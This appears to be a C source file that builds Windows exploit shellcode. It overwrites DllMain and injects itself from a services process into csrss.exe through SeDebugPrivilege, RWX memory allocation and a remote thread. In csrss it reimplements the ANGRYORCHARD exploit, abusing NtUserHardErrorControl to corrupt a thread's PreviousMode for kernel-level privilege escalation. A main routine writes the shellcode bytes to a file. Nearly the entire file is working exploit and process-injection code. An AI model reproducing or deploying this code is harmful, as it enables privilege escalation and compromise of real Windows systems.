#define _CRT_SECURE_NO_WARNINGS

#include <phnt_windows.h>
#include <phnt.h>
#include <DbgHelp.h>
#include <intrin.h>
#include <stdio.h>

#include "GMShellcode.h"

#pragma optimize("", off)

PSHELLCODE_PARAMS GetParams();
PVOID FindMyBase(PSHELLCODE_PARAMS pParams);
VOID ServicesShellcode(PSHELLCODE_PARAMS pParams);
VOID CsrssShellcode(PSHELLCODE_PARAMS pParams);
struct _TEB* CurrentTeb(VOID);
size_t _wcslen(const wchar_t* str);
VOID _RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString);

// Overwrites DllMain (technically CRT DllMain)
BOOL APIENTRY Shellcode(
    HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    PSHELLCODE_PARAMS pParams = GetParams();

    if ((DWORD)(ULONG_PTR)CurrentTeb()->ClientId.UniqueProcess == pParams->dwCsrssPid)
    {
        CsrssShellcode(pParams);
    }
    else
    {
        ServicesShellcode(pParams);
    }

    return TRUE;
}

VOID ServicesShellcode( PSHELLCODE_PARAMS pParams )
{
    BOOLEAN ignored = 0;
    HANDLE hCsrss = NULL;
    PVOID pCsrssBuffer = NULL;
    SIZE_T regionSize = pParams->mySize;
    ULONG bytesWritten = 0;
    HANDLE hThread = NULL;
    OBJECT_ATTRIBUTES objAttr = { 0, };
    CLIENT_ID csrssCid = { (HANDLE)(ULONG_PTR)pParams->dwCsrssPid, NULL };
    PVOID pMyBase = FindMyBase(pParams);
    LARGE_INTEGER timeout = { 0, };

    if (!pMyBase)
    {
        int x = 0;
        __debugbreak();
    }

    // Enable SeDebugPrivilege
    if (0 != pParams->pRtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &ignored))
    {
        int x = 1;
        __debugbreak();
    }

    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
    pParams->pNtOpenProcess(&hCsrss, MAXIMUM_ALLOWED, &objAttr, &csrssCid);
    if (NULL == hCsrss)
    {
        int x = 2;
        __debugbreak();
    }

    pParams->pNtAllocateVirtualMemory(hCsrss, &pCsrssBuffer, 0, &regionSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (NULL == pCsrssBuffer)
    {
        int x = 3;
        __debugbreak();
    }

    if (!NT_SUCCESS(pParams->pNtWriteVirtualMemory(hCsrss, pCsrssBuffer, pMyBase, pParams->mySize, &bytesWritten)))
    {
        int x = 4;
        __debugbreak();
    }

    if (!NT_SUCCESS(pParams->pRtlCreateUserThread(hCsrss, NULL, FALSE, 0, NULL, NULL, (PUCHAR)pCsrssBuffer, NULL, &hThread, NULL)))
    {
        int x = 5;
        __debugbreak();
    }

#if 0
    timeout.QuadPart = -50 * 10000;
    if (!NT_SUCCESS(pParams->pNtWaitForSingleObject(hThread, FALSE, &timeout)))
    {
        int x = 6;
        __debugbreak();
    }
#endif

    // Don't trigger WER
    (void)pParams->pNtTerminateProcess(NtCurrentProcess(), 0);
}

// This is a reimplementation of ANGRYORCHARD's exploit
// https://github.com/SecIdiot/ANGRYORCHARD/blob/0a4720f7e07e86a9ac2783411b81efac14938e26/Exploit.c#L71-L77
VOID CsrssShellcode( PSHELLCODE_PARAMS pParams )
{
    NTSTATUS ntStatus = STATUS_SUCCESS;
    DESKTOPUSEDESKTOP desktop = { 0, };
    HANDLE hMutex = NULL;
    HANDLE hReq = NULL;
    HANDLE hDone = NULL;
    HANDLE hSection = NULL;
    UNICODE_STRING uniStr = { 0, };
    OBJECT_ATTRIBUTES objAttr = { 0, };
    LARGE_INTEGER sectionSize = { 0, };
    PIPC_SECTION pSection = NULL;
    SIZE_T viewSize = 0;
    SECURITY_DESCRIPTOR sd = { 0, };

    // No SD
    sd.Revision = SECURITY_DESCRIPTOR_REVISION;

    // Create mutex
    _RtlInitUnicodeString(&uniStr, pParams->mutexName);
    InitializeObjectAttributes(&objAttr, &uniStr, OBJ_CASE_INSENSITIVE, NULL, &sd);
    ntStatus = pParams->pNtCreateMutant(&hMutex, MUTEX_ALL_ACCESS, &objAttr, FALSE);
    if (!NT_SUCCESS(ntStatus))
    {
        int x = 0x10;
        __debugbreak();
    }

    // Create request event
    _RtlInitUnicodeString(&uniStr, pParams->reqName);
    ntStatus = pParams->pNtCreateEvent(&hReq, MUTANT_ALL_ACCESS, &objAttr, SynchronizationEvent, FALSE);
    if (!NT_SUCCESS(ntStatus))
    {
        int x = 0x11;
        __debugbreak();
    }

    // Create completion event
    _RtlInitUnicodeString(&uniStr, pParams->doneName);
    ntStatus = pParams->pNtCreateEvent(&hDone, MUTANT_ALL_ACCESS, &objAttr, SynchronizationEvent, FALSE);
    if (!NT_SUCCESS(ntStatus))
    {
        int x = 0x12;
        __debugbreak();
    }

    _RtlInitUnicodeString(&uniStr, pParams->sectionName);
    sectionSize.QuadPart = 4096;
    ntStatus = pParams->pNtCreateSection(&hSection, SECTION_ALL_ACCESS, &objAttr, &sectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(ntStatus))
    {
        int x = 0x13;
        __debugbreak();
    }

    ntStatus = pParams->pNtMapViewOfSection(hSection, (HANDLE)-1, (PVOID*)&pSection, 0, 4096, NULL, &viewSize, ViewUnmap, 0, PAGE_READWRITE);
    if (!NT_SUCCESS(ntStatus))
    {
        int x = 0x14;
        __debugbreak();
    }

    // Wait for a request to come in
    while (STATUS_WAIT_0 == pParams->pNtWaitForSingleObject(hReq, FALSE, NULL))
    {
        pSection->ntStatus = STATUS_PENDING;

        ntStatus = pParams->pNtUserSetInformationThread(NtCurrentThread(), UserThreadUseDesktop, &desktop, sizeof(desktop));
        if (!NT_SUCCESS(ntStatus))
        {
            pSection->ntStatus = ntStatus;
            int x = 0x15;
            __debugbreak();
        }

        if (!pSection->pThread)
        {
            ntStatus = STATUS_NOT_FOUND;
        }
        else
        {
            desktop.Restore.pDeskRestore = (PUCHAR)pSection->pThread + ETHREAD_PREVIOUSMODE_OFFSET + OBJECT_HEADER_SIZE;
            ntStatus = pParams->pNtUserHardErrorControl(HardErrorDetachNoQueue, NtCurrentThread(), &desktop.Restore);
            if (!NT_SUCCESS(ntStatus))
            {
                pSection->ntStatus = ntStatus;
                int x = 0x16;
                __debugbreak();
            }

            // Set result
            pSection->ntStatus = STATUS_SUCCESS;
            pSection->pThread = NULL;
        }

        // Send ACK
        pParams->pNtSetEvent(hDone, NULL);
    }
}

struct _TEB* CurrentTeb( VOID )
{
    return (struct _TEB*)__readgsqword(FIELD_OFFSET(NT_TIB, Self));
}

PVOID WhereAmI()
{
    return _ReturnAddress();
}

size_t _wcslen(const wchar_t* str) 
{
    size_t i = 0;

    while (*str)
    {
        str++;
        i++;
    }

    return i;
}

VOID _RtlInitUnicodeString(
    PUNICODE_STRING         DestinationString,
    PCWSTR SourceString
)
{
    DestinationString->Buffer = (PWSTR)SourceString;
    DestinationString->Length = (USHORT)_wcslen(SourceString) * sizeof(wchar_t);
    DestinationString->MaximumLength = DestinationString->Length;
}

BOOLEAN memeq(PUCHAR a, PUCHAR b, DWORD len)
{
    for (DWORD i = 0; i < len; i++)
    {
        if (a[i] != b[i])
        {
            return FALSE;
        }
    }
    return TRUE;
}

PVOID FindMyBase(PSHELLCODE_PARAMS pParams)
{
    PUCHAR pSearch = (PUCHAR)WhereAmI();

    for (;; pSearch--)
    {
        if (memeq(pSearch, pParams->magicNops, sizeof(pParams->magicNops)))
        {
            return pSearch;
        }
    }

    return NULL;
}

PSHELLCODE_PARAMS GetParams()
{
    PUCHAR pSearch = (PUCHAR)WhereAmI();
    
    for (;;pSearch++)
    {
        PSHELLCODE_PARAMS pCandidate = (PSHELLCODE_PARAMS)pSearch;

        if ((MAGIC1 == pCandidate->magic1) && (MAGIC2 == pCandidate->magic2))
        {
            return pCandidate;
        }
    }

    return NULL;
}

BOOL EndShellcode()
{
    return TRUE;
}

#include <PathCch.h>

int main()
{
    WCHAR myPath[MAX_PATH] = { 0, };
    HMODULE hMe = GetModuleHandle(NULL);
    PUCHAR shellcodeStart = (PUCHAR)GetProcAddress(hMe, "Shellcode");
    PUCHAR shellcodeEnd = (PUCHAR)GetProcAddress(hMe, "EndShellcode");
    const SIZE_T shellcodeLength = (DWORD)(ULONG_PTR)(shellcodeEnd - shellcodeStart);
    HMODULE hFile = NULL;
    DWORD bytesWritten = 0;

    GetModuleFileNameW(NULL, myPath, ARRAYSIZE(myPath));
    wcsncat(myPath, L".shellcode", ARRAYSIZE(myPath) - wcslen(myPath));

    hFile = CreateFileW(myPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (INVALID_HANDLE_VALUE == hFile)
    {
        printf(" [!] Failed to open output file: %ws\n", myPath);
        return 1;
    }
    if (!WriteFile(hFile, shellcodeStart, (DWORD)shellcodeLength, &bytesWritten, NULL) ||
        (bytesWritten != shellcodeLength))
    {
        printf(" [!] Failed to write shellcode with GLE %u\n", GetLastError());
        return 1;
    }

    printf(" [+] Shellcode written to output file: %ws\n", myPath);

    return 0;
}
